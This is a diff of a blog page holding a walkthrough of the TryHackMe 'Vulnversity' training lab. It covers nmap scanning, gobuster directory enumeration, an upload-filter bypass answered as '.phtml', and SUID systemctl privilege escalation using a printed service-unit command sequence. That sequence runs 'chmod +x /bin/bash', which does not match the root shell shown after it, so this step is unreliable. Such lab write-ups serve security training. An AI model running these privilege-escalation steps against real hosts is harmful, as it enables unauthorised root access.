-      js = d.createElement(s)
-      js.id = id
-      js.src = 'https://platform.twitter.com/widgets.js'
-      fjs.parentNode.insertBefore(js, fjs)
-
-      t._e = []
-      t.ready = function (f) {
-        t._e.push(f)
-      }
-
-      return t
-    })(document, 'script', 'twitter-wjs')
-  }
-</script>
-<script src="/js/jquery.min.js"></script>
-<script src="/js/semantic.min.js"></script>
-<script src="/js/jquery.overlayScrollbars.min.js"></script>
-<script src="/js/header.js"></script>
-<script src="/js/main.js"></script>
-<script src="/js/theme.js"></script>
-
-    
-<script src="/js/html2canvas.min.js"></script>
-<script src="/js/post.js"></script>
-
-
-<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js"></script>
-
-
-
-<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js"></script>
-
-<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js"></script>
-
-
-
-<script>
-  hljs.initHighlightingOnLoad()
-  setHighlightTheme()
-
-  function setHighlightTheme() {
-    var isDark = localStore.getItem('hugo-theme-dream-is-dark')
-    isDark = isDark ? isDark : window.defaultDark ? 'y' : isDark
-
-    var lightTheme = "tomorrow"
-    var darkTheme = "tomorrow-night"
-    var theme = isDark === 'y' ? darkTheme : lightTheme
-
-    $('link[data-highlight]').attr('href', 'https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/' + theme + '.min.css')
-    $('pre').css('background', isDark === 'y' ? '#333' : '')
-  }
-</script>
-
-
-
-
-
-    
-    <div class="ui inverted segment" id="dream-search">
-  <div class="ui search">
-    <div class="ui transparent input">
-      <input class="prompt" type="text" placeholder="Search" />
-    </div>
-    <div class="results"></div>
-  </div>
-</div>
-<script>
-  $(document).ready(function () {
-    $.getJSON('http:\/\/localhost:1313\//index.json', function (data) {
-      $('.ui.search').search({
-        source: data,
-        searchFields: ['title'],
-        showNoResults: true,
-      })
-    })
-  })
-</script>
-<script src="/js/search.js"></script>
-
-    
-
-    
-
-    
-  </body>
-</html>
+<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe Room Vulnversity | Classroom</title><meta name=keywords content="tryhackme,rooms,thm,Vulnversity"><meta name=description content="TryHackMe Room Vulnversity solved by Animesh Roy. this is a walkthough. read more..."><meta name=author content="Animesh Roy"><link rel=canonical href=https://classroom.anir0y.in/post/thm-room-vulnversity/><link crossorigin=anonymous href=/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css integrity="sha256-2jIR5e+Ge/K3X9WmUVz+1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as=style><link rel=icon href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=icon type=image/png sizes=16x16 href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=icon type=image/png sizes=32x32 href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=apple-touch-icon href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=mask-icon href=https://classroom.anir0y.in/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://classroom.anir0y.in/post/thm-room-vulnversity/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="https://classroom.anir0y.in/post/thm-room-vulnversity/"><meta property="og:site_name" content="Classroom"><meta property="og:title" content="TryHackMe Room Vulnversity"><meta property="og:description" content="TryHackMe Room Vulnversity solved by Animesh Roy. this is a walkthough. read more..."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-06-09T20:10:48+05:30"><meta property="article:modified_time" content="2021-06-09T20:10:48+05:30"><meta property="article:tag" content="Tryhackme"><meta property="article:tag" content="Rooms"><meta property="article:tag" content="Thm"><meta property="article:tag" content="Vulnversity"><meta property="og:image" content="https://classroom.anir0y.in/img/thm.gif"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://classroom.anir0y.in/img/thm.gif"><meta name=twitter:title content="TryHackMe Room Vulnversity"><meta name=twitter:description content="TryHackMe Room Vulnversity solved by Animesh Roy. this is a walkthough. read more..."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://classroom.anir0y.in/post/"},{"@type":"ListItem","position":2,"name":"TryHackMe Room Vulnversity","item":"https://classroom.anir0y.in/post/thm-room-vulnversity/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe Room Vulnversity","name":"TryHackMe Room Vulnversity","description":"TryHackMe Room Vulnversity solved by Animesh Roy. this is a walkthough. read more...","keywords":["tryhackme","rooms","thm","Vulnversity"],"articleBody":"Vulnversity TASK 01: Deploy the machine TASK 02: Reconnaissance Tools\nNmap CheatSheet Flags Flag ID Questions 1 There are many nmap “cheatsheets” online that you can use too. N\\A 2 Scan the box, how many ports are open? 3 What version of the squid proxy is running on the machine? 4 How many ports will nmap scan if the flag -p-400 was used? 400 5 Using the nmap flag -n what will it not resolve? DNS 6 What is the most likely operating system this machine is running? ubuntu 7 What port is the web server running on? 8 Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don’t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background) Flag6 based on Nmap Fingerprints.\nTASK 03: Locating directories using GoBuster dir Mode Options gobuster dir [flags] Flags: -f, --add-slash Append / to each request -c, --cookies string Cookies to use for the requests -e, --expanded Expanded mode, print full URLs -x, --extensions string File extension(s) to search for -r, --follow-redirect Follow redirects -H, --headers stringArray Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2' -h, --help help for dir -l, --include-length Include the length of the body in the output -k, --no-tls-validation Skip TLS certificate verification -n, --no-status Don't print status codes -P, --password string Password for Basic Auth -p, --proxy string Proxy to use for requests [http(s)://host:port] -s, --status-codes string Positive status codes (will be overwritten with status-codes-blacklist if set) (default \"200,204,301,302,307,401,403\") -b, --status-codes-blacklist string Negative status codes (will override status-codes if set) --timeout duration HTTP Timeout (default 10s) -u, --url string The target URL -a, --useragent string Set the User-Agent string (default \"gobuster/3.1.0\") -U, --username string Username for Basic Auth -d, --discover-backup Upon finding a file search for backup files --wildcard Force continued operation when wildcard found Global Flags: -z, --no-progress Don't display progress -o, --output string Output file to write results to (defaults to stdout) -q, --quiet Don't print the banner and other noise -t, --threads int Number of concurrent threads (default 10) --delay duration Time each thread waits between requests (e.g. 1500ms) -v, --verbose Verbose output (errors) -w, --wordlist string Path to the wordlist dns Mode Help Usage: gobuster dns [flags] Flags: -d, --domain string The target domain -h, --help help for dns -r, --resolver string Use custom DNS server (format server.com or server.com:port) -c, --show-cname Show CNAME records (cannot be used with '-i' option) -i, --show-ips Show IP addresses --timeout duration DNS resolver timeout (default 1s) --wildcard Force continued operation when wildcard found Global Flags: -z, --no-progress Don't display progress -o, --output string Output file to write results to (defaults to stdout) -q, --quiet Don't print the banner and other noise -t, --threads int Number of concurrent threads (default 10) --delay duration Time each thread waits between requests (e.g. 1500ms) -v, --verbose Verbose output (errors) -w, --wordlist string Path to the wordlist vhost Mode Options Usage: gobuster vhost [flags] Flags: -c, --cookies string Cookies to use for the requests -r, --follow-redirect Follow redirects -H, --headers stringArray Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2' -h, --help help for vhost -k, --no-tls-validation Skip TLS certificate verification -P, --password string Password for Basic Auth -p, --proxy string Proxy to use for requests [http(s)://host:port] --timeout duration HTTP Timeout (default 10s) -u, --url string The target URL -a, --useragent string Set the User-Agent string (default \"gobuster/3.1.0\") -U, --username string Username for Basic Auth Global Flags: -z, --no-progress Don't display progress -o, --output string Output file to write results to (defaults to stdout) -q, --quiet Don't print the banner and other noise -t, --threads int Number of concurrent threads (default 10) --delay duration Time each thread waits between requests (e.g. 1500ms) -v, --verbose Verbose output (errors) -w, --wordlist string Path to the wordlist Flag-03 |1|What is the directory that has an upload form page?| |||\ntask 04: Compromise the webserver Flag-04 Flag ID Questions 1 Try upload a few file types to the server, what common extension seems to be blocked? .php 2 N\\a 3 Run this attack, what extension is allowed? .phtml 4 Get the Shell working 5 What is the name of the user who manages the webserver? 6 What is the user flag? Flag-4.1 php is a common way to get reserse shell/backdoor in web application\nFlag-4.3 intruder gives you diffrent content-length. you can check the response body to verify.\nTask 05: Privilege Escalation Flag-05 Flag ID Questions 1 On the system, search for all SUID files. What file stands out? read /bin/systemctl 2 Become root and get the last flag (/root/root.txt) flag-5.1 $ find / -user root -perm -4000 -exec ls -ldb {} \\; ...[snip]... -rwsr-xr-x 1 root root 659856 Feb 13 2019 /bin/systemctl ...[snip]... credit : Gtfo bins\nflag-5.2 # Run the followning TF=$(mktemp).service echo '[Service] Type=oneshot ExecStart=/bin/sh -c \"chmod +x /bin/bash\" [Install] WantedBy=multi-user.target' \u003e $TF ./systemctl link $TF ./systemctl enable --now $TF after successfull run. do this:\nid uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/bash -p #to exploit and gain root priv id uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data) ","wordCount":"864","inLanguage":"en","image":"https://classroom.anir0y.in/img/thm.gif","datePublished":"2021-06-09T20:10:48+05:30","dateModified":"2021-06-09T20:10:48+05:30","author":{"@type":"Person","name":"Animesh Roy"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://classroom.anir0y.in/post/thm-room-vulnversity/"},"publisher":{"@type":"Organization","name":"Classroom","logo":{"@type":"ImageObject","url":"https://classroom.anir0y.in/img/avatar.jpeg"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://classroom.anir0y.in/ accesskey=h title="Classroom (Alt + H)"><img src=https://classroom.anir0y.in/img/avatar.jpeg alt aria-label=logo height=35>Classroom</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://classroom.anir0y.in/post/ title=Posts><span>Posts</span></a></li><li><a href=https://classroom.anir0y.in/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://classroom.anir0y.in/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://classroom.anir0y.in/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://classroom.anir0y.in/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://classroom.anir0y.in/about/me/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://classroom.anir0y.in/>Home</a>&nbsp;»&nbsp;<a href=https://classroom.anir0y.in/post/>Posts</a></div><h1 class="post-title entry-hint-parent">TryHackMe Room Vulnversity</h1><div class=post-description>TryHackMe Room Vulnversity solved by Animesh Roy. this is a walkthough. read more...</div><div class=post-meta><span title='2021-06-09 20:10:48 +0530 IST'>June 9, 2021</span>&nbsp;·&nbsp;<span>5 min</span>&nbsp;·&nbsp;<span>Animesh Roy</span>&nbsp;|&nbsp;<span>
+<a href=https://github.com/anir0y/classroom/tree/master/content/post/thm-room-vulnversity.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></span></div></header><figure class=entry-cover><img loading=eager src=https://classroom.anir0y.in/img/thm.gif alt="cover image"></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#vulnversity>Vulnversity</a></li><li><a href=#task-01--deploy-the-machine>TASK 01: Deploy the machine</a></li><li><a href=#task-02-reconnaissance>TASK 02: Reconnaissance</a><ul><li><a href=#flags>Flags</a></li></ul></li><li><a href=#task-03-locating-directories-using-gobuster>TASK 03: Locating directories using GoBuster</a><ul><li><a href=#dir-mode-options><code>dir</code> Mode Options</a></li><li><a href=#dns-mode-help>dns Mode Help</a></li><li><a href=#vhost-mode-options>vhost Mode Options</a></li><li><a href=#flag-03>Flag-03</a></li></ul></li><li><a href=#task-04-compromise-the-webserver>task 04: Compromise the webserver</a><ul><li><a href=#flag-04>Flag-04</a></li></ul></li><li><a href=#task-05-privilege-escalation>Task 05: Privilege Escalation</a><ul><li><a href=#flag-05>Flag-05</a></li></ul></li><li><a href=#flag-52>flag-5.2</a></li></ul></nav></div></details></div><div class=post-content><h2 id=vulnversity>Vulnversity<a hidden class=anchor aria-hidden=true href=#vulnversity>#</a></h2><h2 id=task-01--deploy-the-machine>TASK 01: Deploy the machine<a hidden class=anchor aria-hidden=true href=#task-01--deploy-the-machine>#</a></h2><hr><h2 id=task-02-reconnaissance>TASK 02: Reconnaissance<a hidden class=anchor aria-hidden=true href=#task-02-reconnaissance>#</a></h2><p><strong>Tools</strong></p><ul><li><a href=https://nmap.org>Nmap</a></li><li>CheatSheet</li></ul><h3 id=flags>Flags<a hidden class=anchor aria-hidden=true href=#flags>#</a></h3><table><thead><tr><th style=text-align:left>Flag ID</th><th style=text-align:center>Questions</th></tr></thead><tbody><tr><td style=text-align:left>1</td><td style=text-align:center>There are many nmap &ldquo;cheatsheets&rdquo; online that you can use too.</td></tr><tr><td style=text-align:left></td><td style=text-align:center>N\A</td></tr><tr><td style=text-align:left>2</td><td style=text-align:center>Scan the box, how many ports are open?</td></tr><tr><td style=text-align:left></td><td style=text-align:center><img alt=img loading=lazy src=https://i.imgur.com/0XgYocm.png></td></tr><tr><td style=text-align:left>3</td><td style=text-align:center>What version of the squid proxy is running on the machine?</td></tr><tr><td style=text-align:left></td><td style=text-align:center><img alt=img loading=lazy src=https://i.imgur.com/0XgYocm.png></td></tr><tr><td style=text-align:left>4</td><td style=text-align:center>How many ports will nmap scan if the flag -p-400 was used?</td></tr><tr><td style=text-align:left></td><td style=text-align:center><code>400</code></td></tr><tr><td style=text-align:left>5</td><td style=text-align:center>Using the nmap flag -n what will it not resolve?</td></tr><tr><td style=text-align:left></td><td style=text-align:center><code>DNS</code></td></tr><tr><td style=text-align:left>6</td><td style=text-align:center>What is the most likely operating system this machine is running?</td></tr><tr><td style=text-align:left></td><td style=text-align:center><code>ubuntu</code></td></tr><tr><td style=text-align:left>7</td><td style=text-align:center>What port is the web server running on?</td></tr><tr><td style=text-align:left></td><td style=text-align:center><img alt=img-anir0y loading=lazy src=https://i.imgur.com/Tsd6hc7.png></td></tr><tr><td style=text-align:left>8</td><td style=text-align:center>Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don&rsquo;t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)</td></tr><tr><td style=text-align:left></td><td></td></tr></tbody></table><h4 id=flag6>Flag6<a hidden class=anchor aria-hidden=true href=#flag6>#</a></h4><p>based on Nmap Fingerprints.</p><hr><script type=text/javascript language=javascript>var aax_size="300x250",aax_pubname="anir0y-21",aax_src="302"</script><script type=text/javascript language=javascript src=https://c.amazon-adsystem.com/aax2/assoc.js></script><hr><h2 id=task-03-locating-directories-using-gobuster>TASK 03: Locating directories using GoBuster<a hidden class=anchor aria-hidden=true href=#task-03-locating-directories-using-gobuster>#</a></h2><h3 id=dir-mode-options><code>dir</code> Mode Options<a hidden class=anchor aria-hidden=true href=#dir-mode-options>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  gobuster dir <span class=o>[</span>flags<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Flags:
+</span></span><span class=line><span class=cl>  -f, --add-slash                     Append / to each request
+</span></span><span class=line><span class=cl>  -c, --cookies string                Cookies to use <span class=k>for</span> the requests
+</span></span><span class=line><span class=cl>  -e, --expanded                      Expanded mode, print full URLs
+</span></span><span class=line><span class=cl>  -x, --extensions string             File extension<span class=o>(</span>s<span class=o>)</span> to search <span class=k>for</span>
+</span></span><span class=line><span class=cl>  -r, --follow-redirect               Follow redirects
+</span></span><span class=line><span class=cl>  -H, --headers stringArray           Specify HTTP headers, -H <span class=s1>&#39;Header1: val1&#39;</span> -H <span class=s1>&#39;Header2: val2&#39;</span>
+</span></span><span class=line><span class=cl>  -h, --help                          <span class=nb>help</span> <span class=k>for</span> dir
+</span></span><span class=line><span class=cl>  -l, --include-length                Include the length of the body in the output
+</span></span><span class=line><span class=cl>  -k, --no-tls-validation             Skip TLS certificate verification
+</span></span><span class=line><span class=cl>  -n, --no-status                     Don<span class=s1>&#39;t print status codes
+</span></span></span><span class=line><span class=cl><span class=s1>  -P, --password string               Password for Basic Auth
+</span></span></span><span class=line><span class=cl><span class=s1>  -p, --proxy string                  Proxy to use for requests [http(s)://host:port]
+</span></span></span><span class=line><span class=cl><span class=s1>  -s, --status-codes string           Positive status codes (will be overwritten with status-codes-blacklist if set) (default &#34;200,204,301,302,307,401,403&#34;)
+</span></span></span><span class=line><span class=cl><span class=s1>  -b, --status-codes-blacklist string Negative status codes (will override status-codes if set)
+</span></span></span><span class=line><span class=cl><span class=s1>      --timeout duration              HTTP Timeout (default 10s)
+</span></span></span><span class=line><span class=cl><span class=s1>  -u, --url string                    The target URL
+</span></span></span><span class=line><span class=cl><span class=s1>  -a, --useragent string              Set the User-Agent string (default &#34;gobuster/3.1.0&#34;)
+</span></span></span><span class=line><span class=cl><span class=s1>  -U, --username string               Username for Basic Auth
+</span></span></span><span class=line><span class=cl><span class=s1>  -d, --discover-backup               Upon finding a file search for backup files
+</span></span></span><span class=line><span class=cl><span class=s1>      --wildcard                      Force continued operation when wildcard found
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Global Flags:
+</span></span></span><span class=line><span class=cl><span class=s1>  -z, --no-progress       Don&#39;</span>t display progress
+</span></span><span class=line><span class=cl>  -o, --output string     Output file to write results to <span class=o>(</span>defaults to stdout<span class=o>)</span>
+</span></span><span class=line><span class=cl>  -q, --quiet             Don<span class=err>&#39;</span>t print the banner and other noise
+</span></span><span class=line><span class=cl>  -t, --threads int       Number of concurrent threads <span class=o>(</span>default 10<span class=o>)</span>
+</span></span><span class=line><span class=cl>      --delay duration    Time each thread waits between requests <span class=o>(</span>e.g. 1500ms<span class=o>)</span>
+</span></span><span class=line><span class=cl>  -v, --verbose           Verbose output <span class=o>(</span>errors<span class=o>)</span>
+</span></span><span class=line><span class=cl>  -w, --wordlist string   Path to the wordlist
+</span></span></code></pre></div><h3 id=dns-mode-help>dns Mode Help<a hidden class=anchor aria-hidden=true href=#dns-mode-help>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Usage:
+</span></span><span class=line><span class=cl>  gobuster dns <span class=o>[</span>flags<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Flags:
+</span></span><span class=line><span class=cl>  -d, --domain string      The target domain
+</span></span><span class=line><span class=cl>  -h, --help               <span class=nb>help</span> <span class=k>for</span> dns
+</span></span><span class=line><span class=cl>  -r, --resolver string    Use custom DNS server <span class=o>(</span>format server.com or server.com:port<span class=o>)</span>
+</span></span><span class=line><span class=cl>  -c, --show-cname         Show CNAME records <span class=o>(</span>cannot be used with <span class=s1>&#39;-i&#39;</span> option<span class=o>)</span>
+</span></span><span class=line><span class=cl>  -i, --show-ips           Show IP addresses
+</span></span><span class=line><span class=cl>      --timeout duration   DNS resolver timeout <span class=o>(</span>default 1s<span class=o>)</span>
+</span></span><span class=line><span class=cl>      --wildcard           Force continued operation when wildcard found
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Global Flags:
+</span></span><span class=line><span class=cl>  -z, --no-progress       Don<span class=s1>&#39;t display progress
+</span></span></span><span class=line><span class=cl><span class=s1>  -o, --output string     Output file to write results to (defaults to stdout)
+</span></span></span><span class=line><span class=cl><span class=s1>  -q, --quiet             Don&#39;</span>t print the banner and other noise
+</span></span><span class=line><span class=cl>  -t, --threads int       Number of concurrent threads <span class=o>(</span>default 10<span class=o>)</span>
+</span></span><span class=line><span class=cl>      --delay duration    Time each thread waits between requests <span class=o>(</span>e.g. 1500ms<span class=o>)</span>
+</span></span><span class=line><span class=cl>  -v, --verbose           Verbose output <span class=o>(</span>errors<span class=o>)</span>
+</span></span><span class=line><span class=cl>  -w, --wordlist string   Path to the wordlist
+</span></span></code></pre></div><h3 id=vhost-mode-options>vhost Mode Options<a hidden class=anchor aria-hidden=true href=#vhost-mode-options>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Usage:
+</span></span><span class=line><span class=cl>  gobuster vhost <span class=o>[</span>flags<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Flags:
+</span></span><span class=line><span class=cl>  -c, --cookies string        Cookies to use <span class=k>for</span> the requests
+</span></span><span class=line><span class=cl>  -r, --follow-redirect       Follow redirects
+</span></span><span class=line><span class=cl>  -H, --headers stringArray   Specify HTTP headers, -H <span class=s1>&#39;Header1: val1&#39;</span> -H <span class=s1>&#39;Header2: val2&#39;</span>
+</span></span><span class=line><span class=cl>  -h, --help                  <span class=nb>help</span> <span class=k>for</span> vhost
+</span></span><span class=line><span class=cl>  -k, --no-tls-validation     Skip TLS certificate verification
+</span></span><span class=line><span class=cl>  -P, --password string       Password <span class=k>for</span> Basic Auth
+</span></span><span class=line><span class=cl>  -p, --proxy string          Proxy to use <span class=k>for</span> requests <span class=o>[</span>http<span class=o>(</span>s<span class=o>)</span>://host:port<span class=o>]</span>
+</span></span><span class=line><span class=cl>      --timeout duration      HTTP Timeout <span class=o>(</span>default 10s<span class=o>)</span>
+</span></span><span class=line><span class=cl>  -u, --url string            The target URL
+</span></span><span class=line><span class=cl>  -a, --useragent string      Set the User-Agent string <span class=o>(</span>default <span class=s2>&#34;gobuster/3.1.0&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>  -U, --username string       Username <span class=k>for</span> Basic Auth
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Global Flags:
+</span></span><span class=line><span class=cl>  -z, --no-progress       Don<span class=s1>&#39;t display progress
+</span></span></span><span class=line><span class=cl><span class=s1>  -o, --output string     Output file to write results to (defaults to stdout)
+</span></span></span><span class=line><span class=cl><span class=s1>  -q, --quiet             Don&#39;</span>t print the banner and other noise
+</span></span><span class=line><span class=cl>  -t, --threads int       Number of concurrent threads <span class=o>(</span>default 10<span class=o>)</span>
+</span></span><span class=line><span class=cl>      --delay duration    Time each thread waits between requests <span class=o>(</span>e.g. 1500ms<span class=o>)</span>
+</span></span><span class=line><span class=cl>  -v, --verbose           Verbose output <span class=o>(</span>errors<span class=o>)</span>
+</span></span><span class=line><span class=cl>  -w, --wordlist string   Path to the wordlist
+</span></span></code></pre></div><h3 id=flag-03>Flag-03<a hidden class=anchor aria-hidden=true href=#flag-03>#</a></h3><p>|1|What is the directory that has an upload form page?|
+||<img alt=img loading=lazy src=https://i.imgur.com/AaAwcRw.png>|</p><hr><h2 id=task-04-compromise-the-webserver>task 04: Compromise the webserver<a hidden class=anchor aria-hidden=true href=#task-04-compromise-the-webserver>#</a></h2><h3 id=flag-04>Flag-04<a hidden class=anchor aria-hidden=true href=#flag-04>#</a></h3><table><thead><tr><th style=text-align:left>Flag ID</th><th style=text-align:center>Questions</th></tr></thead><tbody><tr><td style=text-align:left>1</td><td style=text-align:center>Try upload a few file types to the server, what common extension seems to be blocked?</td></tr><tr><td style=text-align:left></td><td style=text-align:center><a href=#flag-41><code>.php</code></a></td></tr><tr><td style=text-align:left>2</td><td style=text-align:center>N\a</td></tr><tr><td style=text-align:left>3</td><td style=text-align:center>Run this attack, what extension is allowed?</td></tr><tr><td style=text-align:left></td><td style=text-align:center><a href=#flag-43><code>.phtml</code></a></td></tr><tr><td style=text-align:left>4</td><td style=text-align:center>Get the Shell working</td></tr><tr><td style=text-align:left></td><td style=text-align:center><a href="https://www.youtube.com/watch?v=QlcZxDPuJTE"><img alt="Alt text" loading=lazy src=https://img.youtube.com/vi/QlcZxDPuJTE/hqdefault.jpg></a></td></tr><tr><td style=text-align:left>5</td><td style=text-align:center>What is the name of the user who manages the webserver?</td></tr><tr><td style=text-align:left></td><td style=text-align:center><a href="https://www.youtube.com/watch?v=ugnYyudFY1Y"><img alt=TryHackMe loading=lazy src=https://img.youtube.com/vi/ugnYyudFY1Y/mqdefault.jpg></a></td></tr><tr><td style=text-align:left>6</td><td style=text-align:center>What is the user flag?</td></tr><tr><td style=text-align:left></td><td style=text-align:center><img alt=TryHackMe loading=lazy src=https://i.imgur.com/xDyG5Fq.png></td></tr></tbody></table><h4 id=flag-41>Flag-4.1<a hidden class=anchor aria-hidden=true href=#flag-41>#</a></h4><p>php is a common way to get <code>reserse shell/backdoor</code> in web application</p><h4 id=flag-43>Flag-4.3<a hidden class=anchor aria-hidden=true href=#flag-43>#</a></h4><p>intruder gives you diffrent content-length. you can check the response body to verify.</p><hr><h2 id=task-05-privilege-escalation>Task 05: Privilege Escalation<a hidden class=anchor aria-hidden=true href=#task-05-privilege-escalation>#</a></h2><h3 id=flag-05>Flag-05<a hidden class=anchor aria-hidden=true href=#flag-05>#</a></h3><table><thead><tr><th style=text-align:left>Flag ID</th><th style=text-align:center>Questions</th></tr></thead><tbody><tr><td style=text-align:left>1</td><td style=text-align:center>On the system, search for all SUID files. What file stands out?</td></tr><tr><td style=text-align:left><a href=#flag-51>read</a></td><td style=text-align:center><a href=#flag-51><code>/bin/systemctl</code></a></td></tr><tr><td style=text-align:left>2</td><td style=text-align:center>Become root and get the last flag (/root/root.txt)</td></tr><tr><td style=text-align:left></td><td style=text-align:center><img alt=img loading=lazy src=https://i.imgur.com/1qWDfR3.png></td></tr></tbody></table><h4 id=flag-51>flag-5.1<a hidden class=anchor aria-hidden=true href=#flag-51>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ find / -user root -perm -4000 -exec ls -ldb <span class=o>{}</span> <span class=se>\;</span>
+</span></span><span class=line><span class=cl>...<span class=o>[</span>snip<span class=o>]</span>...
+</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>659856</span> Feb <span class=m>13</span>  <span class=m>2019</span> /bin/systemctl
+</span></span><span class=line><span class=cl>...<span class=o>[</span>snip<span class=o>]</span>...
+</span></span></code></pre></div><blockquote><p>credit : <a href=https://gtfobins.github.io/gtfobins/systemctl/>Gtfo bins</a></p></blockquote><p><img loading=lazy src=https://i.imgur.com/5z5748W.png></p><h2 id=flag-52>flag-5.2<a hidden class=anchor aria-hidden=true href=#flag-52>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Run the followning</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>TF</span><span class=o>=</span><span class=k>$(</span>mktemp<span class=k>)</span>.service
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;[Service]
+</span></span></span><span class=line><span class=cl><span class=s1>Type=oneshot
+</span></span></span><span class=line><span class=cl><span class=s1>ExecStart=/bin/sh -c &#34;chmod +x /bin/bash&#34;
+</span></span></span><span class=line><span class=cl><span class=s1>[Install]
+</span></span></span><span class=line><span class=cl><span class=s1>WantedBy=multi-user.target&#39;</span> &gt; <span class=nv>$TF</span>
+</span></span><span class=line><span class=cl>./systemctl link <span class=nv>$TF</span>
+</span></span><span class=line><span class=cl>./systemctl <span class=nb>enable</span> --now <span class=nv>$TF</span>
+</span></span></code></pre></div><p>after successfull run. do this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>id
